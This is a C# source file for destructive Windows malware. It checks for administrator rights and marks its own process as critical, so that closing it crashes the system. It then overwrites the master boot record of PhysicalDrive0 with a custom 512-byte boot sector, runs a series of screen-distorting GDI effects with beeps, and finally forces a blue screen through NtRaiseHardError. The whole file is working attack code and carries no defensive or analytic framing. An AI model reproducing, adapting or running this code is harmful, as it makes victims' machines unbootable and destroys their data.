using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace MbrOverwriter
{
    public static class Class1
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;

        private const uint MbrSize = 512u;

        public static void OverwriteMBR()
        {
            var mbrData = new byte[]
            {
                // MBR data goes here
                0xE8, 0x06, 0x00, 0xE8, 0x11, 0x00, 0xE8, 0x26, 0x00, 0x68, 0x00, 0xA0, 0x07, 0xB8, 0x13, 0x00,
0xCD, 0x10, 0x31, 0xC9, 0x31, 0xD2, 0xC3, 0x31, 0xC0, 0xCD, 0x1A, 0x89, 0x16, 0x45, 0x7D, 0xC3,
0x31, 0xC0, 0xCD, 0x1A, 0x2B, 0x16, 0x45, 0x7D, 0x81, 0xFA, 0x6C, 0x01, 0x73, 0x42, 0xC3, 0xE8,
0xEE, 0xFF, 0x89, 0xCB, 0x31, 0xD3, 0x88, 0xD8, 0x02, 0x06, 0x43, 0x7D, 0xC0, 0xE8, 0x05, 0x3C,
0x1E, 0x77, 0x07, 0x3C, 0x14, 0x72, 0x08, 0xAA, 0xEB, 0x08, 0x2C, 0x32, 0xAA, 0xEB, 0x03, 0x04,
0x3A, 0xAA, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x08, 0x81, 0xFA, 0xC8, 0x00, 0x73, 0x07, 0xEB,
0xCE, 0x31, 0xC9, 0x42, 0xEB, 0xC9, 0x31, 0xC9, 0x31, 0xD2, 0xFF, 0x06, 0x43, 0x7D, 0xEB, 0xBF,
0xE8, 0x2B, 0x00, 0xEB, 0x4C, 0x81, 0xFD, 0x40, 0x01, 0x73, 0x0A, 0x81, 0xFA, 0xC8, 0x00, 0x73,
0x09, 0xAA, 0x45, 0xEB, 0x3C, 0x31, 0xED, 0x42, 0xEB, 0x37, 0x31, 0xED, 0x31, 0xD2, 0x31, 0xFF,
0xD9, 0x06, 0x3F, 0x7D, 0xD8, 0x06, 0x3B, 0x7D, 0xD9, 0x1E, 0x3B, 0x7D, 0xEB, 0x23, 0x60, 0x31,
0xDB, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE, 0xBA, 0xC9, 0x03, 0x88, 0xD8, 0xEE, 0xB0, 0x00, 0xEE,
0xEE, 0x88, 0xD8, 0xEE, 0x88, 0xD8, 0xEE, 0xEE, 0x43, 0x81, 0xFB, 0xFF, 0x00, 0x72, 0xE2, 0x61,
0xC3, 0x89, 0x2E, 0x27, 0x7D, 0x89, 0x16, 0x2B, 0x7D, 0xDB, 0x06, 0x3B, 0x7D, 0xD9, 0xFE, 0xD8,
0x0E, 0x2B, 0x7D, 0xD9, 0x1E, 0x33, 0x7D, 0xDB, 0x06, 0x3B, 0x7D, 0xD9, 0xFF, 0xD8, 0x0E, 0x27,
0x7D, 0xD8, 0x26, 0x33, 0x7D, 0xD9, 0x1E, 0x2F, 0x7D, 0xDB, 0x06, 0x3B, 0x7D, 0xD9, 0xFF, 0xD8,
0x0E, 0x2B, 0x7D, 0xD9, 0x1E, 0x37, 0x7D, 0xDB, 0x06, 0x3B, 0x7D, 0xD9, 0xFE, 0xD8, 0x0E, 0x27,
0x7D, 0xD8, 0x06, 0x37, 0x7D, 0xD9, 0x1E, 0x31, 0x7D, 0x8B, 0x1E, 0x2F, 0x7D, 0x33, 0x1E, 0x31,
0x7D, 0x81, 0xE3, 0x10, 0x27, 0x88, 0xD8, 0xF7, 0xC5, 0x01, 0x00, 0x74, 0x04, 0x04, 0x14, 0xEB,
0x02, 0x04, 0x0A, 0xAA, 0xE9, 0x4E, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x42, 0x0A,
0xD7, 0x23, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

            };

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}

namespace GraphicalEffects
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
            IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, uint flags);

        [DllImport("gdi32.dll", SetLastError = true)]
        static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
            IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

        [DllImport("gdi32.dll")]
        static extern int SetStretchBltMode(IntPtr hdc, int mode);

        [DllImport("gdi32.dll", SetLastError = true)]
        static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

        const int SRCCOPY = 0x00CC0020;
        const int NOTSRCCOPY = 0x00330008;
        const int DARK_RED_ROP = 0x00660046;
        const int GREEN_ROP = 0x00660066;
        const int BLUE_ROP = 0x00660044;
        const int SM_CXSCREEN = 0;
        const int SM_CYSCREEN = 1;
        const uint RDW_ERASE = 0x0004;
        const uint RDW_INVALIDATE = 0x0001;
        const uint RDW_ALLCHILDREN = 0x0080;

        static Random random = new Random();

        public static void ShowEffects()
        {
            IntPtr desktopDC = GetDC(IntPtr.Zero);
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);

            // First effect: Random color blocks with beep
            DateTime endTime = DateTime.Now.AddSeconds(20);
            while (DateTime.Now < endTime)
            {
                int x = random.Next(0, screenWidth);
                int y = random.Next(0, screenHeight);
                int width = random.Next(290, 290);
                int height = random.Next(290, 290);

                int dx = random.Next(-28, 28); // Move dx and dy inside the loop
                int dy = random.Next(-28, 28);

                int randomNumber = random.Next(3);
                int rop;
                if (randomNumber == 0)
                    rop = DARK_RED_ROP;
                else if (randomNumber == 1)
                    rop = GREEN_ROP;
                else
                    rop = BLUE_ROP;

                BitBlt(desktopDC, x + dx, y + dy, width, height, desktopDC, x, y, rop);
                Console.Beep();
                Thread.Sleep(10);
            }

            // Second effect: Screen inversion with beep
            DateTime start = DateTime.Now;
            while ((DateTime.Now - start).TotalSeconds < 5)
            {
                BitBlt(desktopDC, 0, 0, screenWidth, screenHeight, desktopDC, -3, -3, NOTSRCCOPY);
                Console.Beep();
            }

            // Third effect: Alternating screen inversion with beep
            start = DateTime.Now;
            while ((DateTime.Now - start).TotalSeconds < 8)
            {
                PatBlt(desktopDC, 0, 0, screenWidth, screenHeight, 0x005A0049);
                Console.Beep();
                Thread.Sleep(100);
                PatBlt(desktopDC, 0, 0, screenWidth, screenHeight, 0x005A0049);
                Console.Beep();
                Thread.Sleep(100);
            }

            // Fourth effect: Wavy effect with beep
            int dxWave = 1, dyWave = 1;
            double angle = 0;
            int size = 1;
            int speed = 5;
            start = DateTime.Now;
            while ((DateTime.Now - start).TotalSeconds < 40)
            {
                BitBlt(desktopDC, 0, 0, screenWidth, screenHeight, desktopDC, dxWave, dyWave, SRCCOPY);
                dxWave = (int)Math.Ceiling(Math.Sin(angle) * size * 20);
                dyWave = (int)Math.Ceiling(Math.Cos(angle) * size * 20);
                angle += speed / 90.0;
                if (angle > Math.PI)
                {
                    angle = -Math.PI;
                }
                Console.Beep();
            }

            // Fifth and sixth effects: Zoom in and out with beep
            IntPtr desktop = GetDesktopWindow();
            IntPtr hdc2 = GetWindowDC(desktop);
            void Redraw()
            {
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
                Console.Beep();
            }

            void ZoomVertical()
            {
                IntPtr hdc = GetWindowDC(IntPtr.Zero);
                for (int i = 0; i < 15; i++)
                {
                    SetStretchBltMode(hdc, 4);
                    StretchBlt(hdc, 0, 0 - 10, screenWidth + 20, screenHeight, hdc, 0, 0, screenWidth, screenHeight, DARK_RED_ROP);
                    StretchBlt(hdc, 0, 0 - 10, screenWidth + 20, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
                }
                ReleaseDC(IntPtr.Zero, hdc);
            }

            void ZoomHorizontal()
            {
                IntPtr hdc = GetWindowDC(IntPtr.Zero);
                for (int i = 0; i < 15; i++)
                {
                    SetStretchBltMode(hdc, 4);
                    StretchBlt(hdc, 0 - 10, 0, screenWidth, screenHeight + 90, hdc, 0, 0, screenWidth, screenHeight, DARK_RED_ROP);
                    StretchBlt(hdc, 0 - 10, 0, screenWidth, screenHeight + 90, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
                }
                ReleaseDC(IntPtr.Zero, hdc);
            }

            DateTime startTime = DateTime.Now;
            TimeSpan duration = TimeSpan.FromSeconds(30);
            while ((DateTime.Now - startTime) < duration)
            {
                ZoomVertical();
                Redraw();
                ZoomHorizontal();
                Redraw();
            }

            // Release the DC
            ReleaseDC(IntPtr.Zero, desktopDC);
        }
    }
}

// Seventh payload
namespace SeventhPayload
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, int rop);

        static void Sleep(int milliseconds)
        {
            Thread.Sleep(milliseconds);
        }

        public static void ShowEffect()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);

            DateTime startTime = DateTime.Now;
            TimeSpan duration = TimeSpan.FromSeconds(30);

            Random random = new Random();

            while (DateTime.Now - startTime < duration)
            {
                hdc = GetDC(IntPtr.Zero);
                int x = random.Next(0, screenWidth);
                int y = random.Next(0, screenHeight);
                int y1 = random.Next(y - 10, y + 10);
                int v4 = random.Next(0, 100);
                BitBlt(hdc, x, y, 200, 200, hdc, (v4 % 21) + x - 10, y1, 0xEE0086);
                int v5 = random.Next(0, 100);
                Console.Beep();
                Sleep(10);
            }
        }
    }
}

namespace BSOD
{
    class BSODProgram
    {
        [DllImport("ntdll.dll")]
        public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, uint Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("ntdll.dll")]
        public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

        const int OPTION_SHUTDOWN = 6;
        const int SHUTDOWN_PRIVILEGE = 19;
        const uint STATUS_NOT_IMPLEMENTED = 0xC0000002;

        public static void TriggerBSOD()
        {
            bool enabled;
            uint response;

            if (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, true, false, out enabled) == 0)
            {
                NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, out response);
            }
        }
    }
}

class MainProgram
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

    const int ProcessBreakOnTermination = 29;
    const int BreakOnTerminationFlag = 1;

    static void Main(string[] args)
    {
        if (!IsAdministrator())
        {
            Console.WriteLine("This application needs to be run as an administrator.");
            return;
        }

        Process currentProcess = Process.GetCurrentProcess();
        IntPtr handle = currentProcess.Handle;

        int isCritical = BreakOnTerminationFlag; // Set process as critical
        uint status = NtSetInformationProcess(handle, ProcessBreakOnTermination, ref isCritical, sizeof(int));

        if (status == 0)
        {
            Console.WriteLine("Process is now critical. Closing this process will cause a system crash.");
        }
        else
        {
            Console.WriteLine("Failed to set process as critical. Status: " + status);
        }

        // Call to overwrite MBR
        MbrOverwriter.Class1.OverwriteMBR();

        // Call to show graphical effects
        GraphicalEffects.Program.ShowEffects();

        // Call to show seventh payload
        SeventhPayload.Program.ShowEffect();

        // Call to trigger BSOD
        BSOD.BSODProgram.TriggerBSOD();
    }

    private static bool IsAdministrator()
    {
        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        var principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }
}
